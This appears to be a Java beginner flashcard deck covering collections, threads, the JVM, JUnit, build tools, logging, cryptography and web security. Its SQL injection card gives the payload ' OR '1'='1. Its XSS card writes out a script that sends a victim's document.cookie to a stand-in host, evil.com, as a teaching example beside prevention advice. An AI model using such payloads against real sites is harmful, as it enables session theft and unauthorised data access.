# Java Beginner Questions
# Format: Front[TAB]Back

What is the difference between `==` and `.equals()` in Java?	`==` compares object references (memory addresses); `.equals()` compares object content/values.
What are the most common built-in exceptions to know?	`NullPointerException` — dereferencing null. `IllegalArgumentException` — invalid argument value. `IllegalStateException` — method called at wrong time. `IndexOutOfBoundsException` / `ArrayIndexOutOfBoundsException` — invalid index. `ClassCastException` — invalid cast. `UnsupportedOperationException` — operation not supported (e.g., immutable collection mutation). `StackOverflowError` — recursion too deep. `OutOfMemoryError` — heap exhausted.
What is `Error` vs `Exception` in Java?	`Error` represents serious JVM-level problems that are almost always unrecoverable: `OutOfMemoryError`, `StackOverflowError`, `AssertionError`. Applications should generally NOT catch `Error`. `Exception` represents conditions an application might reasonably handle. Catching `Throwable` catches both, which is almost never appropriate.
What is the root interface of the Java collections framework?	`Collection<E>` (and `Map<K,V>` for key-value stores, which does not extend Collection).
What is the difference between `ArrayList` and `LinkedList`?	`ArrayList` uses a dynamic array (fast random access, slow insertions/deletions in the middle); `LinkedList` uses a doubly-linked list (fast insertions/deletions, slow random access).
What is the difference between `HashSet`, `LinkedHashSet`, and `TreeSet`?	`HashSet`: unordered, O(1) ops; `LinkedHashSet`: insertion-ordered, O(1) ops; `TreeSet`: sorted (natural/Comparator order), O(log n) ops.
What is the difference between `HashMap` and `TreeMap`?	`HashMap`: unordered, O(1) average; `TreeMap`: sorted by key, O(log n); both are not thread-safe.
What is `ConcurrentHashMap`?	A thread-safe `Map` implementation that allows concurrent reads and segmented writes without locking the entire map.
What does `Collections.unmodifiableList()` return?	A read-only view of the given list; any modification attempt throws `UnsupportedOperationException`.
What is the difference between `Iterator` and `ListIterator`?	`Iterator` is forward-only; `ListIterator` supports bidirectional traversal and element modification.
What is a `PriorityQueue` in Java?	An unbounded queue based on a min-heap; elements are ordered by natural ordering or a Comparator, with the smallest element at the head.
What is the difference between `List.of()` and `Arrays.asList()`?	`List.of()` returns an immutable list; `Arrays.asList()` returns a fixed-size list backed by the array (supports `set`, but not `add`/`remove`).
What is a `Deque`?	A double-ended queue that supports element insertion and removal at both ends. `ArrayDeque` is a common implementation.
What does the `Comparable` interface define?	A natural ordering for objects of a class via the `compareTo()` method.
What does the `Comparator` interface define?	An external ordering strategy for objects, passed to sorting methods or sorted collections, via the `compare()` method.
What is the time complexity of `HashMap.get()` on average?	O(1) average, O(n) worst case (all keys hash to the same bucket).
What is a thread in Java?	The smallest unit of execution within a process. Created by extending `Thread` or implementing `Runnable`.
What is the difference between `Runnable` and `Callable`?	`Runnable.run()` returns void and cannot throw checked exceptions; `Callable.call()` returns a value and can throw checked exceptions.
What does `synchronized` do?	Acquires an intrinsic lock (monitor) on an object, ensuring that only one thread at a time can execute the synchronized block or method.
What is a `volatile` variable?	A variable whose reads and writes are always done directly to main memory, preventing CPU cache inconsistency across threads.
What is a race condition?	A bug that occurs when the outcome depends on the timing/interleaving of multiple threads accessing shared data without proper synchronization.
What is a deadlock?	A situation where two or more threads are each waiting for a lock held by the other, causing all of them to block indefinitely.
What is `ExecutorService`?	A higher-level replacement for managing threads directly; it maintains a pool of threads and executes submitted tasks asynchronously.
What is `Future`?	Represents the result of an asynchronous computation. `get()` blocks until the result is available.
What is `CompletableFuture`?	An extension of `Future` that supports composable asynchronous pipelines with callbacks like `thenApply`, `thenCompose`, and `exceptionally`.
What is `AtomicInteger`?	A class in `java.util.concurrent.atomic` that provides atomic (lock-free, thread-safe) operations on an integer value.
What is a `CountDownLatch`?	A synchronization aid that allows one or more threads to wait until a set of operations in other threads completes (countdown reaches zero).
What is a `Semaphore`?	A synchronization construct that controls access to a shared resource by maintaining a count of available permits.
What is the difference between `wait()` and `sleep()`?	`wait()` releases the intrinsic lock and suspends until `notify()` or `notifyAll()`; `sleep()` pauses the thread but does NOT release any locks.
What is `ThreadLocal`?	A class that provides thread-local variables; each thread holds its own independent copy of the variable.
What is the happens-before relationship?	A guarantee in the Java Memory Model that all actions before a write are visible to a thread that subsequently reads that value.
What are the main memory areas of the JVM?	Heap, Method Area (Metaspace in Java 8+), JVM Stack (per thread), Native Method Stack, Program Counter Register.
What is the Heap in the JVM?	The runtime data area shared among all threads where objects and arrays are allocated. It is the primary target of garbage collection.
What is the Stack in the JVM?	A per-thread memory area that stores stack frames for each method call, holding local variables, operand stack, and return values.
What is the Metaspace (Java 8+)?	The replacement for the old PermGen; stores class metadata in native memory rather than the heap, growing automatically.
What is Just-In-Time (JIT) compilation?	The JVM compiles frequently executed bytecode (hot spots) into native machine code at runtime to improve performance.
What is garbage collection?	The automatic process by which the JVM reclaims heap memory occupied by objects that are no longer reachable.
What is the difference between Minor GC and Major GC?	Minor GC collects the Young Generation (Eden + Survivor spaces); Major (or Full) GC collects the Old Generation (Tenured space), usually more expensive.
What is the Young Generation?	The heap region where newly created objects are allocated. It consists of Eden space and two Survivor spaces.
What is the Old Generation?	The heap region where long-lived objects (that survived multiple Minor GCs) are promoted. Collected less frequently but with greater cost.
What is the G1 Garbage Collector?	A region-based, server-style GC (default since Java 9) that divides the heap into equal-sized regions and aims for predictable pause times.
What is a ClassLoader?	A component that loads class files into the JVM at runtime. The three built-in loaders are Bootstrap, Extension (Platform), and Application ClassLoader.
What is bytecode?	The intermediate, platform-independent instruction set that Java source code compiles into; it is executed or JIT-compiled by the JVM.
What is the difference between `-Xms` and `-Xmx` JVM flags?	`-Xms` sets the initial heap size; `-Xmx` sets the maximum heap size.
What is a memory leak in Java?	A situation where objects are no longer needed but are still referenced (e.g., in a static collection), preventing GC from reclaiming the memory.
What is `finalize()`?	A method called by the GC before reclaiming an object's memory. Deprecated since Java 9; use `Cleaner` or try-with-resources instead.
What are the three JUnit 5 modules?	JUnit Platform (test launcher/engine SPI), JUnit Jupiter (new API for writing tests), JUnit Vintage (runs JUnit 3/4 tests on the platform).
What annotation marks a JUnit 5 test method?	`@Test` from `org.junit.jupiter.api`. Methods must be non-private and non-static (default visibility is fine).
What is the JUnit 5 equivalent of JUnit 4's `@BeforeClass`?	`@BeforeAll` — runs once before all tests in the class. Method must be `static` (unless `@TestInstance(Lifecycle.PER_CLASS)` is used).
What does `@BeforeEach` do in JUnit 5?	Runs before each test method in the class; equivalent to JUnit 4's `@Before`. Used for per-test setup (e.g. creating fresh objects).
What does `@AfterEach` do in JUnit 5?	Runs after each test method, even if the test threw an exception. Used for cleanup (e.g. closing resources).
What does `@AfterAll` do in JUnit 5?	Runs once after all tests in the class; method must be `static` unless `@TestInstance(Lifecycle.PER_CLASS)` is used.
How do you disable a test in JUnit 5?	Annotate it with `@Disabled("reason")`. The test is skipped with a message rather than failing.
What does `@DisplayName` do?	Provides a human-readable name for a test class or method, shown in test reports and IDEs.
How does `@Nested` help organise tests?	Allows inner non-static classes to group related tests. Nested classes can have their own `@BeforeEach` / `@AfterEach`. Useful for describing different contexts (e.g. "when user is logged in").
What class provides assertions in JUnit 5?	`org.junit.jupiter.api.Assertions`. Common methods: `assertEquals`, `assertNotEquals`, `assertTrue`, `assertFalse`, `assertNull`, `assertNotNull`, `assertThrows`, `assertAll`.
How do you assert that a method throws a specific exception in JUnit 5?	`assertThrows(ExpectedException.class, () -> methodUnderTest())`. Returns the exception instance for further inspection (e.g. checking the message).
What does `assertAll` do in JUnit 5?	Executes all supplied assertions and reports all failures together, rather than stopping at the first failure. Example: `assertAll(() -> assertEquals(1, a), () -> assertEquals(2, b))`.
What is Mockito used for?	Creating mock objects — test doubles that simulate dependencies, allowing you to test a unit in isolation without requiring real implementations (databases, HTTP clients, etc.).
How do you create a mock in Mockito?	`Mockito.mock(SomeClass.class)` or annotate a field with `@Mock` and extend the class with `@ExtendWith(MockitoExtension.class)` (JUnit 5).
What is the AAA (Arrange-Act-Assert) pattern?	Structure tests in three sections: **Arrange** — set up objects and inputs; **Act** — call the method under test; **Assert** — verify the result. Improves readability and clarity.
What is the difference between a unit test and an integration test?	**Unit test**: tests a single class/method in isolation (dependencies mocked). **Integration test**: tests multiple components working together, often involving a real database, file system, or network.
What is a test fixture?	The fixed state (objects, data, configuration) needed before a test runs. Set up in `@BeforeEach` / `@BeforeAll`.
What is test isolation and why does it matter?	Each test must be independent — no shared mutable state between tests. Violations cause flaky tests that pass or fail depending on execution order.
Why was `java.time` (JSR-310) introduced in Java 8 to replace `java.util.Date` and `Calendar`?	`java.util.Date` and `Calendar` had severe design problems: (1) Mutability — `Date` is mutable, making it unsafe to share. (2) Poor API — `Calendar.get(MONTH)` is 0-based (January = 0). (3) No timezone clarity — `Date` doesn't carry a timezone but its `toString()` formats in the local zone. (4) Not thread-safe. `java.time` (based on Joda-Time) is immutable, fluent, clearly separates date/time concepts, and has an excellent API. All `java.time` classes are immutable and thread-safe.
What are the two main classes in `java.util.regex`?	`Pattern` — a compiled regular expression (thread-safe, reusable). `Matcher` — an engine that applies a `Pattern` to a character sequence (not thread-safe, one use per match operation).
How do you compile and use a regex in Java?	`Pattern p = Pattern.compile("\\d+"); Matcher m = p.matcher("abc123def"); if (m.find()) { System.out.println(m.group()); // "123" }`
What is Maven?	A build automation and project management tool. It uses a declarative `pom.xml` (Project Object Model) to describe the project, manage dependencies, and define the build lifecycle.
What is the Maven build lifecycle?	An ordered sequence of phases. The **default** lifecycle (most common): validate → compile → test → package → verify → install → deploy. Running a phase executes all prior phases first.
What does `mvn package` do?	Executes all default lifecycle phases up to and including `package` — compiles sources, runs tests, and packages the output (e.g. JAR or WAR) in the `target/` directory.
What does `mvn install` do?	Same as `package` plus copies the artifact to the local Maven repository (`~/.m2/repository`), making it available to other local projects as a dependency.
What does `mvn clean` do?	Executes the **clean** lifecycle, deleting the `target/` directory. Commonly run as `mvn clean package` to ensure a fresh build.
What are Maven coordinates?	The three identifiers that uniquely identify an artifact: `groupId` (organisation/domain, e.g. `com.example`), `artifactId` (project name), and `version`. Together they resolve to a path in the repository.
What is the Maven local repository?	`~/.m2/repository` — a local cache of downloaded artifacts. Maven checks here first before fetching from remote repositories (Maven Central, corporate Nexus/Artifactory).
What is Gradle?	A build tool using a Groovy or Kotlin DSL instead of XML. Incremental builds, build caching, and a powerful task model make it faster than Maven for large projects. Default for Android projects.
What is the Gradle build file?	`build.gradle` (Groovy DSL) or `build.gradle.kts` (Kotlin DSL). Declares plugins, dependencies, tasks, and configuration.
What is the Gradle wrapper?	`gradlew` / `gradlew.bat` — a script committed to the repo that downloads and uses the exact Gradle version specified in `gradle/wrapper/gradle-wrapper.properties`. Ensures reproducible builds without requiring Gradle installed.
What is the difference between hashing, encoding, and encryption?	Hashing: one-way mathematical transformation producing a fixed-size digest. Cannot be reversed. Used for integrity checks and password storage. Examples: SHA-256, bcrypt. Encoding: reversible transformation of representation format — NOT a security measure. Anyone can decode it. Examples: Base64, URL encoding. Encryption: reversible transformation that requires a secret key to decrypt. Used for confidentiality. Examples: AES (symmetric), RSA (asymmetric). Common mistake: treating Base64 as security — it is not.
What is symmetric vs asymmetric encryption?	Symmetric (secret-key) encryption uses the SAME key for encryption and decryption. Fast, suitable for bulk data. Key challenge: securely exchanging the shared key. Example: AES. Asymmetric (public-key) encryption uses a KEY PAIR: anything encrypted with the public key can only be decrypted with the private key, and vice versa. Slower, used for key exchange and digital signatures. Example: RSA, EC. In practice: use asymmetric key exchange to establish a shared symmetric key, then use symmetric encryption for the data.
What is a cryptographic hash function and what properties must it have?	A cryptographic hash function maps arbitrary input to a fixed-size digest. Required properties: (1) Deterministic — same input always produces same output. (2) One-way (pre-image resistance) — infeasible to find input from output. (3) Collision resistance — infeasible to find two different inputs with the same hash. (4) Avalanche effect — small input change produces completely different output. Use SHA-256 or SHA-3 for integrity checking. DO NOT use MD5 or SHA-1 — they are cryptographically broken (collision attacks exist).
Why are MD5 and SHA-1 not suitable for password hashing even if they're not broken?	Even unbroken hash functions like SHA-256 are unsuitable for password hashing because they are designed to be FAST. An attacker with a GPU can compute billions of SHA-256 hashes per second, making brute-force and dictionary attacks trivial. Password hashing requires algorithms that are intentionally SLOW (configurable cost factor) and include a per-user random salt. Use: bcrypt (standard, widely supported), Argon2id (winner of Password Hashing Competition, recommended), or PBKDF2 (FIPS compliant). These make brute-force attacks computationally impractical.
What are the standard log levels in order of severity?	TRACE < DEBUG < INFO < WARN < ERROR. A logger configured at INFO will emit INFO, WARN, and ERROR but suppress TRACE and DEBUG.
What is the logging facade pattern and why use it?	A facade (e.g. SLF4J) decouples application code from the logging implementation. You can switch from Logback to Log4j2 by changing a dependency — no code changes. Application code always imports `org.slf4j.Logger`.
Name the main Java logging frameworks.	**SLF4J** (facade), **Logback** (SLF4J native implementation, Spring Boot default), **Log4j2** (Apache, high performance, async), **java.util.logging / JUL** (JDK built-in, least featured).
How do you create an SLF4J logger?	`private static final Logger log = LoggerFactory.getLogger(MyClass.class);` — use the class as the logger name so the hierarchy matches the package structure.
What is the principle of least privilege?	Grant each component, user, or process only the minimum permissions it needs to perform its function — nothing more. Applied to Java: don't expose public APIs for things that should be internal; use `private`/package-private; don't run services as root; limit database user permissions to only the tables and operations needed. This limits the blast radius if that component is compromised or buggy.
Why should you never store plaintext passwords?	If an attacker gains access to your database (SQL injection, backup theft, insider threat), plaintext passwords expose every user's credentials immediately — and users reuse passwords across sites. Instead, store a slow cryptographic hash using bcrypt, Argon2, or PBKDF2. These algorithms are intentionally slow (work-factor tunable) and use per-user random salts, making brute-force and rainbow-table attacks impractical.
What data should never be logged?	Passwords (even hashed). Authentication tokens, session IDs, API keys. Credit card numbers, CVVs, bank account numbers. Personally Identifiable Information (PII): national IDs, full birth dates, medical records. Private keys or certificates. Log the event (e.g., "login attempt") but strip or mask sensitive parameters before writing to logs. Log aggregators and log files are often less secure than primary datastores.
What is input validation and why is it important?	Input validation is the process of verifying that all data entering a system conforms to expected type, length, format, and range before processing it. Without it, attackers exploit unexpected input to trigger SQL injection, command injection, path traversal, or application crashes. In Java: use allow-lists (define what's valid) rather than deny-lists (blocking known bad input). Validate on the server side — never trust client-side-only validation.
What is SQL injection and why is string concatenation in queries dangerous?	SQL injection occurs when user-supplied input is concatenated directly into a SQL string, letting attackers alter the query structure. Example: `"SELECT * FROM users WHERE name = '" + username + "'"` — if `username` is `' OR '1'='1`, the query returns all users. In Java, always use `PreparedStatement` with parameterized queries: `stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?"); stmt.setString(1, username);`. The driver safely escapes parameters, making injection impossible.
What is XSS (Cross-Site Scripting) at a conceptual level?	XSS is an attack where an attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. Example: a comment box that stores `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` — anyone viewing that comment has their session cookie stolen. Prevention: escape all user-supplied content before rendering it as HTML (encode `<` as `&lt;`, etc.). Never trust data coming from the browser.
Why should you validate data on the server side even if you validate on the client side?	Client-side validation (JavaScript, HTML5 form constraints) can be trivially bypassed — an attacker can use curl, Postman, or browser dev tools to submit any data directly to the server endpoint. Client-side validation is a UX convenience only. Server-side validation is the actual security control. Always treat incoming data as potentially hostile regardless of where it came from.
What is the difference between authentication and authorization?	Authentication (AuthN) is verifying WHO you are — confirming identity via password, token, certificate, biometric, etc. Authorization (AuthZ) is verifying WHAT you are allowed to do — checking permissions after identity is established. Common mistake: checking only authentication (is the user logged in?) but not authorization (does THIS user have permission for THIS resource?), leading to IDOR (Insecure Direct Object Reference) vulnerabilities.
What are the main HTTP methods and their semantics?	`GET` — retrieve a resource; safe and idempotent; no body. `POST` — submit data to create or trigger an action; not idempotent. `PUT` — replace a resource entirely at the given URI; idempotent. `PATCH` — partially update a resource; not necessarily idempotent. `DELETE` — remove the resource; idempotent. `HEAD` — like GET but returns only headers (used to check existence/metadata). `OPTIONS` — returns supported methods (used in CORS preflight). Safe methods (GET, HEAD) must not change server state.
What are the key HTTP status code categories?	1xx Informational: `100 Continue`. 2xx Success: `200 OK`, `201 Created`, `204 No Content`. 3xx Redirection: `301 Moved Permanently`, `302 Found`, `304 Not Modified`. 4xx Client errors: `400 Bad Request`, `401 Unauthorized` (unauthenticated), `403 Forbidden` (authenticated but not authorized), `404 Not Found`, `409 Conflict`, `422 Unprocessable Entity`, `429 Too Many Requests`. 5xx Server errors: `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`, `504 Gateway Timeout`.
What are the components of a URL?	`scheme://userinfo@host:port/path?query#fragment`. Example: `https://user:pass@api.example.com:8443/v1/users?active=true&role=admin#section2`. `scheme` — protocol (`https`, `ftp`). `host` — domain or IP. `port` — optional, default 443 for HTTPS, 80 for HTTP. `path` — resource location. `query` — key=value pairs after `?`, separated by `&`. `fragment` — client-side anchor after `#`, NOT sent to the server.
